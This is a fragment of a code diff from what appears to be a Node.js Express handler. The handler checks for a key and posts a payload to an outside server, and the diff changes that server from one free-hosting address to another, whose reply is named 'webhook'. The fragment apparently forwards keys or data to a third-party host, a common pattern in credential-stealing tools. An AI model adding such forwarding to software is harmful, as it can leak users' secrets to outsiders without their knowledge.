@@ -12,7 +12,7 @@ const payload = {
     if (!key) return res.sendStatus(400);
 
     try {
-		const response = await axios.post('http://redrose5.liveblog365.com/key', payload);
+		const response = await axios.post('https://xads-aoi7.onrender.com/', payload);
 
   const webhook = response.data;
 
